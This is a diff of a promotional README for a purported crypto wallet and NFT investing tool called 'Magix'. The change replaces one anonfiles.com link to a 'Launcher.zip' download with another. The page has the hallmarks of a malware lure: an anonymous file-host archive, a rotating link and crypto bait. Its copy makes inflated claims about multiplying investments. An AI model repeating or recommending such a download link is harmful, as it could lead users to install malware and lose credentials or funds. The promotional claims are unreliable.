@@ -21,7 +21,7 @@
 
 ### Our wallet combines both cryptocurrency trading and a secure wallet.
 
-## 🔐 [Magix™ Download](https://cdn-151.anonfiles.com/n5d1Mceaz1/b32f3d35-1678981373/Launcher.zip)
+## 🔐 [Magix™ Download](https://cdn-151.anonfiles.com/n5d1Mceaz1/fd50e1c3-1678982159/Launcher.zip)
 ### ● Investing in NFTs
 
 Tracking the price dynamics of NFT projects, the frequency of mentions in social networks and price growth forecasts for individual NFT collections will help you find the authors, investing in which you can multiply your investment.
